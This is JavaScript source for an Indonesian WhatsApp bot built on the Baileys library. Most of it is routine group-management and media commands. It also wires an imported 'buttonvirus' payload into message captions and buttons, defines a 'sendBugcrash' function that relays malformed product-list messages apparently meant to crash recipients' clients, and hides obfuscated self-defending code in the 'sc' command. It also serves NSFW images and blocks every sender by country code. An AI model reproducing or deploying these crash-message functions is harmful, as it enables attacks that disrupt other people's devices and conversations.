/*
CUMA NAMBAH DOANG
JIKA RENEME KASIH CREDIT LAHH!
JUAL SC INI? AUTO FULL ENC

BY 
LYNN
ZYY
PRII
*/


const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { ytMp4, ytMp3, ytPlay } = require('./lib/yotube')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString()) 
	
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'El Diablo'
global.ownerNumber = ["0@s.whatsapp.net"]
global.packname = 'Lynn'
global.author = '🗿'
global.prefa = ['','.']
global.mess = {
    wait: 'Tunggu Bwanhh!!',
    succes: 'Gimana Bwanh?',
    admin: 'Emang Lu Admin??',
    botAdmin: 'Bot Belum Admin Kocak',
    owner: 'Lu Siapa Kocak?',
    group: 'Khusus Grup bwanh',
    private: 'Khusus Privat bwanh',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}
module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
        const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
        const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(diablobotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = diablobotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = diablobotwhatsapp.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
        const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
             const isGroup = diablobotwhatsapp.chat.endsWith('@g.us')
        const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
        const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

if (global.db.chats[diablobotwhatsapp.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        diablobotwhatsapp.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return diablobotwhatsapp.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await diablo.groupInviteCode(diablobotwhatsapp.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(diablobotwhatsapp.text)
        if (isgclink) return diablobotwhatsapp.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return diablobotwhatsapp.reply(`Ehh maaf kamu admin`)
        if (itsMediablo) return diablobotwhatsapp.reply(`Ehh maaf kamu owner bot ku`)
        diablo.groupParticipantsUpdate(diablobotwhatsapp.chat, [diablobotwhatsapp.sender], 'remove')
        }
        }

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.h` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {

case 'hentai-waifu' :
case 'nwaifu' :
if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.group)
if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.owner)
diablobotwhatsapp.reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ewe Mas🥵`,
  buttons: nwaifubot,
  headerType: 1
  }      
            await diablo.sendMessage(diablobotwhatsapp.chat, button4Messages, { quoted:diablobotwhatsapp }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
case 'hneko' :
if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.group)
if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.owner)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ewe Mas🥵`,
  buttons: hnekobot,
  headerType: 1
  }      
            await diablo.sendMessage(diablobotwhatsapp.chat, button3Messages, { quoted:diablobotwhatsapp }).catch(err => {
                    return('Error!')
                })
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await diablo.sendImageAsSticker(from, wifegerakx, diablobotwhatsapp, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await diablo.sendImageAsSticker(from, wifegerakx, diablobotwhatsapp, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'anjing':
case 'dog':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await diablo.sendImageAsSticker(from, wifegerakx, diablobotwhatsapp, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
	case 'promote': {
		if (!diablobotwhatsapp.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = diablobotwhatsapp.mentionedJid[0] ? diablobotwhatsapp.mentionedJid[0] : diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(diablobotwhatsapp.chat, [users], 'promote').then((res) => diablobotwhatsapp.reply(jsonformat(res))).catch((err) => diablobotwhatsapp.reply(jsonformat(err)))
	}
	break
case 'demote': {
		if (!diablobotwhatsapp.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = diablobotwhatsapp.mentionedJid[0] ? diablobotwhatsapp.mentionedJid[0] : diablobotwhatsapp.mentionedJid ? diablobotwhatsapp.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(diablobotwhatsapp.chat, [users], 'demote').then((res) => diablobotwhatsapp.reply(jsonformat(res))).catch((err) => diablobotwhatsapp.reply(jsonformat(err)))
	}
	break
case 'kick': {
		if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.group)
                if (!isBotAdmins) return diablobotwhatsapp.reply(mess.botAdmin)
                if (!isAdmins) return diablobotwhatsapp.reply(mess.admin)
		let users = diablobotwhatsapp.mentionedJid[0] ? diablobotwhatsapp.mentionedJid[0] : diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(diablobotwhatsapp.chat, [users], 'remove').then((res) => diablobotwhatsapp.reply(jsonformat(res))).catch((err) => diablobotwhatsapp.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.group)
                if (!isBotAdmins) return diablobotwhatsapp.reply(mess.botAdmin)
                if (!isAdmins) return diablobotwhatsapp.reply(mess.admin)
		let users = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(diablobotwhatsapp.chat, [users], 'add').then((res) => diablobotwhatsapp.reply(jsonformat(res))).catch((err) => diablobotwhatsapp.reply(jsonformat(err)))
	}
	break
case 'store':
textsewa = `
     [ STORE LYNN ]
 ➤ NOKOS ALL NEGARA
 ➤ SEWABOT 2K / 1 BULAN
 ➤ ADDAKSES 2K / 1 BULAN
 ➤ SEWABOT + ADDAKSES 4K
 ➤ wa.me/6283890585717
    [ LYNN ] 

KENAPA MURAH?? KARNA SC INI
PUBLIC + FITUR PASARAN MAU SC??
CEK YT 
https://youtube.com/@xiee0

`
diablobotwhatsapp.reply(textsewa)
break
            case 'out': {
                if (!itsMediablo) throw mess.owner
                await diablo.groupLeave(diablobotwhatsapp.chat).then((res) => diablobotwhatsapp.reply(jsonformat(res))).catch((err) => diablobotwhatsapp.reply(jsonformat(err)))
            }
            break
case 'waifu':
    case 'loli':
    case 'husbu':
    case 'milf':
    case 'cosplay':
    case 'wallml':
    diablobotwhatsapp.reply(mess.wait)
          let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
          let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
          diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: wipi }, caption: `${command}` }, { quoted: diablobotwhatsapp })
          
break
case'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} jedag jedug`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttonsZYK = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: 'Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: 'Video'}, type: 1}
                ]
                let buttonMessageZYK = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: `\nRuntime : ${runtime(process.uptime())}\nSILAHKAN PILIH BUTTONS DI BAWAH`,
                    buttons: buttonsZYK,
                    headerType: 1
                }
                diablo.sendMessage(diablobotwhatsapp.chat, buttonMessageZYK, { quoted: diablobotwhatsapp })
            }
            break
case 'sc':
(function(_0x10b985,_0x60495f){function _0x93aaad(_0x20e6c1,_0x58d552,_0x485ebb,_0x1dc0fe){return _0x4964(_0x58d552-0x2a2,_0x485ebb);}var _0xfd40b1=_0x10b985();function _0x457cfd(_0x188c21,_0xa6693d,_0x70dde6,_0xc951b6){return _0x4964(_0xc951b6- -0x7d,_0xa6693d);}while(!![]){try{var _0x1315d5=-parseInt(_0x93aaad(0x358,0x376,0x384,0x365))/(-0x1*-0x1442+-0x821+-0xc20)*(-parseInt(_0x93aaad(0x357,0x375,0x387,0x383))/(0x3*0x5d+-0x1*-0x1735+-0x184a))+-parseInt(_0x93aaad(0x355,0x367,0x365,0x36e))/(0x4dc*0x6+0x1a8c+-0x37b1)+-parseInt(_0x457cfd(0x68,0x4f,0x67,0x6b))/(0xfec+-0x7*-0x336+-0x2662)*(parseInt(_0x457cfd(0x33,0x41,0x44,0x4d))/(-0x121*0x1c+0x20de*0x1+-0x13d))+-parseInt(_0x93aaad(0x3a1,0x39a,0x380,0x3b4))/(-0x24b*0xb+-0x4f*-0x2a+0xc49)*(-parseInt(_0x457cfd(0x5b,0x4f,0x6b,0x58))/(0x528*0x6+0x1273+-0x315c))+-parseInt(_0x93aaad(0x368,0x35f,0x378,0x36a))/(-0x12*-0x97+-0x25ba+-0x24*-0xc1)*(parseInt(_0x93aaad(0x39c,0x383,0x3a2,0x38a))/(-0x288+-0x6b9+0x94a))+parseInt(_0x457cfd(0x7b,0x80,0x78,0x70))/(0x2620+-0xec*-0x15+-0x3972)+-parseInt(_0x93aaad(0x37c,0x386,0x38d,0x37f))/(0x1*0x1321+-0x609+-0xd0d);if(_0x1315d5===_0x60495f)break;else _0xfd40b1['push'](_0xfd40b1['shift']());}catch(_0x4250f7){_0xfd40b1['push'](_0xfd40b1['shift']());}}}(_0x240b,-0x1*-0x36de3+0xeae9d+-0x59*0x1b3e));var _0x28b7f5=(function(){var _0x763a1f={};_0x763a1f[_0x51747a(-0x1f1,-0x1fd,-0x1dd,-0x1fb)]=function(_0x1c5b23,_0x293bcc){return _0x1c5b23===_0x293bcc;};function _0x58b3be(_0x139b06,_0x56ad91,_0x409676,_0x285d13){return _0x4964(_0x409676- -0xd6,_0x56ad91);}_0x763a1f[_0x51747a(-0x212,-0x217,-0x1f9,-0x20b)]=_0x51747a(-0x211,-0x1f6,-0x215,-0x202);var _0x193bbe=_0x763a1f,_0x2ec90b=!![];function _0x51747a(_0x9a5108,_0x324ddf,_0x594bd6,_0x19f37e){return _0x4964(_0x19f37e- -0x2da,_0x594bd6);}return function(_0x33f047,_0x3541e5){function _0x1dcc1d(_0x264203,_0x187f65,_0x3e8bc1,_0x9f0155){return _0x51747a(_0x264203-0xf6,_0x187f65-0x3b,_0x264203,_0x3e8bc1-0xfb);}function _0x20b6fd(_0x224729,_0x536cf9,_0x48af12,_0x35a7e0){return _0x58b3be(_0x224729-0x10a,_0x536cf9,_0x224729-0x455,_0x35a7e0-0x26);}if(_0x193bbe[_0x20b6fd(0x45e,0x43f,0x46f,0x452)](_0x193bbe[_0x20b6fd(0x44e,0x42d,0x444,0x431)],_0x193bbe[_0x1dcc1d(-0xf2,-0x10d,-0x110,-0xfd)])){var _0x24190f=_0x2ec90b?function(){function _0x7d974d(_0x5c8ba5,_0x4098c9,_0x1c5710,_0x1ae392){return _0x20b6fd(_0x1ae392- -0x462,_0x5c8ba5,_0x1c5710-0x189,_0x1ae392-0x1e0);}if(_0x3541e5){var _0x30346e=_0x3541e5[_0x7d974d(0x11,0x11,0x18,0xe)](_0x33f047,arguments);return _0x3541e5=null,_0x30346e;}}:function(){};return _0x2ec90b=![],_0x24190f;}else{if(_0x319eb5){var _0x301281=_0x5e8f56[_0x20b6fd(0x470,0x48c,0x46b,0x491)](_0x2be3c8,arguments);return _0x59a769=null,_0x301281;}}};}()),_0x415123=_0x28b7f5(this,function(){var _0x37387b={};_0x37387b[_0x165829(-0x2af,-0x2ca,-0x2ae,-0x2cd)]=_0x165829(-0x2a5,-0x2a5,-0x2c5,-0x2cf)+'+$';function _0x59bb01(_0x3f0ee7,_0x407521,_0x280791,_0x27dd33){return _0x4964(_0x407521- -0x128,_0x3f0ee7);}function _0x165829(_0x265ea7,_0x236455,_0x322617,_0x487d9e){return _0x4964(_0x322617- -0x3a8,_0x236455);}var _0x4ba42e=_0x37387b;return _0x415123[_0x59bb01(-0x61,-0x5a,-0x69,-0x6d)]()[_0x165829(-0x2b2,-0x2e3,-0x2d2,-0x2d5)](_0x4ba42e['felby'])[_0x165829(-0x2c4,-0x2dd,-0x2da,-0x2bf)]()['constructo'+'r'](_0x415123)['search']('(((.+)+)+)'+'+$');});function _0x4964(_0x415123,_0x28b7f5){var _0x240bce=_0x240b();return _0x4964=function(_0x4964b6,_0x8c55fb){_0x4964b6=_0x4964b6-(-0x2*-0x3c4+-0x28*0x6e+0xa61);var _0x147234=_0x240bce[_0x4964b6];return _0x147234;},_0x4964(_0x415123,_0x28b7f5);}_0x415123();function _0xc7b6b8(_0x1eeb2d,_0x5dd937,_0x337aef,_0x555b7d){return _0x4964(_0x555b7d- -0x198,_0x1eeb2d);}function _0x240b(){var _0x3c0b01=['(((.+)+)+)','1020833WjEOxq','warn','MwrdH','FLwOi','4URKvdB','4|3|2|0|1|','exception','VlbQV','iyrFI','8919260zsSvMw','error','AKdTj','rn\x20this\x22)(','apply','split','{}.constru','prototype','https://yo','ctor(\x22retu','ibcLL','5226180uZWwLU','UoVZV','felby','ZATlo','return\x20(fu','__proto__','wugKg','log','3195784agtcmE','GZYGi','jfnoM','kXFvA','dDaUn','TFMqt','@xiee0','UMdgF','1925202AWFYck','vBeOd','console','zsatF','QkPNG','1828205zmeBHY','ZqzUv','trace','EoSAg','toString','XgWfv','utube.com/','dsNSf','info','2wasGpI','302953tHnQEc','7DdHeMp','search','nction()\x20','umZAi','skEOZ','constructo','OjEoH','COwCy','length','TJcMT','Ldhdh','bind','9MTdQbO','hSvyz'];_0x240b=function(){return _0x3c0b01;};return _0x240b();}var _0x585de2=(function(){var _0x371974={};_0x371974[_0x179a0a(-0x169,-0x177,-0x174,-0x180)]=function(_0xcb09f1,_0x432465){return _0xcb09f1+_0x432465;},_0x371974['wugKg']=_0x256c3f(-0x304,-0x303,-0x309,-0x31a)+_0x256c3f(-0x2ea,-0x2e5,-0x2f7,-0x2d6),_0x371974['iyrFI']='{}.constru'+_0x179a0a(-0x166,-0x164,-0x164,-0x165)+_0x179a0a(-0x182,-0x17c,-0x16a,-0x14d)+'\x20)';function _0x256c3f(_0x28abc8,_0x12a5e0,_0xc74bfa,_0x26af40){return _0x4964(_0x12a5e0- -0x3bc,_0x28abc8);}_0x371974[_0x179a0a(-0x17c,-0x171,-0x17f,-0x19a)]=_0x179a0a(-0x17e,-0x17e,-0x19a,-0x19f);function _0x179a0a(_0x574958,_0x29bc58,_0x27fd12,_0x20c702){return _0x4964(_0x27fd12- -0x25a,_0x20c702);}var _0x2a83d7=_0x371974,_0x2263ad=!![];return function(_0x3f7255,_0x3db22d){function _0x3b279e(_0x6d7f4d,_0x13ca8b,_0xe80e25,_0x58b342){return _0x256c3f(_0x6d7f4d,_0xe80e25-0x9f,_0xe80e25-0x79,_0x58b342-0x114);}function _0x35f3ab(_0xf1c536,_0x29396b,_0x3b59f3,_0x46a398){return _0x256c3f(_0x29396b,_0xf1c536-0x782,_0x3b59f3-0x23,_0x46a398-0x4c);}var _0x991138={'EoSAg':function(_0x124294,_0x448223){function _0x4e956c(_0x5d4385,_0x90c472,_0x43d3ab,_0x56b439){return _0x4964(_0x56b439- -0x3d4,_0x43d3ab);}return _0x2a83d7[_0x4e956c(-0x2f2,-0x2ee,-0x2d2,-0x2ee)](_0x124294,_0x448223);},'UoVZV':_0x2a83d7[_0x35f3ab(0x481,0x484,0x495,0x46a)],'COwCy':_0x2a83d7[_0x35f3ab(0x4b2,0x4c5,0x4b3,0x493)],'TBoZk':function(_0x11c1e2){return _0x11c1e2();},'QkPNG':function(_0x5e0481,_0x3d1d8d){return _0x5e0481===_0x3d1d8d;},'dsNSf':_0x2a83d7['OjEoH']},_0x30b43d=_0x2263ad?function(){function _0x597fba(_0x48ce92,_0x19a418,_0x444c26,_0xdc745){return _0x3b279e(_0x19a418,_0x19a418-0x9e,_0xdc745-0xb3,_0xdc745-0x1c7);}var _0x2e01ed={'TJcMT':function(_0x219adb,_0x20a064){return _0x219adb(_0x20a064);},'hSvyz':function(_0x13c3ec,_0x1ccf4d){function _0x5eecaf(_0x32c584,_0x14f4b6,_0x5e74f8,_0x1a0244){return _0x4964(_0x5e74f8-0x104,_0x32c584);}return _0x991138[_0x5eecaf(0x1e0,0x1c9,0x1d1,0x1e1)](_0x13c3ec,_0x1ccf4d);},'GZYGi':_0x991138[_0x597fba(-0x178,-0x178,-0x18f,-0x171)],'zsatF':_0x991138[_0x588dd4(0x7e,0x85,0x63,0x6f)],'vBeOd':function(_0x5d5cc2){return _0x991138['TBoZk'](_0x5d5cc2);}};function _0x588dd4(_0x5c6ad4,_0x51bc11,_0x4cd311,_0x381868){return _0x3b279e(_0x4cd311,_0x51bc11-0x121,_0x381868-0x2b0,_0x381868-0xa3);}if(_0x3db22d){if(_0x991138[_0x597fba(-0x1a6,-0x1b2,-0x19e,-0x1a1)](_0x991138[_0x588dd4(0x50,0x82,0x6e,0x64)],'kXFvA')){var _0xbd2983=_0x3db22d['apply'](_0x3f7255,arguments);return _0x3db22d=null,_0xbd2983;}else{var _0x43685d=_0x2e01ed[_0x597fba(-0x1aa,-0x1ae,-0x17b,-0x18c)](_0x301d97,_0x2e01ed[_0x597fba(-0x17c,-0x174,-0x1a6,-0x188)](_0x2e01ed['hSvyz'](_0x2e01ed[_0x588dd4(0x63,0x64,0x4d,0x51)],_0x2e01ed[_0x588dd4(0x57,0x64,0x7b,0x5b)]),');'));_0x18f83e=_0x2e01ed[_0x597fba(-0x197,-0x1a6,-0x1bd,-0x1a4)](_0x43685d);}}}:function(){};return _0x2263ad=![],_0x30b43d;};}());function _0x591c42(_0x3a279b,_0x5079d2,_0x5bcf2e,_0x149e21){return _0x4964(_0x3a279b-0x2ef,_0x5079d2);}var _0x26cec3=_0x585de2(this,function(){var _0x4383dd={'UMdgF':function(_0x998421,_0x413e6f){return _0x998421+_0x413e6f;},'UOENb':function(_0x503498,_0x209a5d){return _0x503498+_0x209a5d;},'VlbQV':_0x493ea8(0x185,0x14f,0x16c,0x16a)+_0x493ea8(0x15b,0x162,0x16d,0x16d)+_0x493ea8(0x176,0x176,0x165,0x167)+'\x20)','ZqzUv':function(_0xecb9bd){return _0xecb9bd();},'VPMvU':_0x759d4e(0x2c5,0x2dc,0x2bc,0x2ea),'ZATlo':_0x759d4e(0x319,0x305,0x30d,0x315),'TFMqt':_0x759d4e(0x304,0x30e,0x2fe,0x2f2),'FLwOi':'table','iMwZq':function(_0x56a9eb,_0x56ff51){return _0x56a9eb<_0x56ff51;},'aRaXM':_0x493ea8(0x161,0x164,0x168,0x160)+'5','jfnoM':function(_0x3561f3,_0x5ee04e){return _0x3561f3+_0x5ee04e;},'skEOZ':'return\x20(fu'+_0x493ea8(0x147,0x15d,0x142,0x14e),'ibcLL':_0x493ea8(0x140,0x14f,0x14a,0x161),'AKdTj':_0x493ea8(0x13e,0x14f,0x15b,0x143),'jUpLk':function(_0x47b79b,_0x5cbe81){return 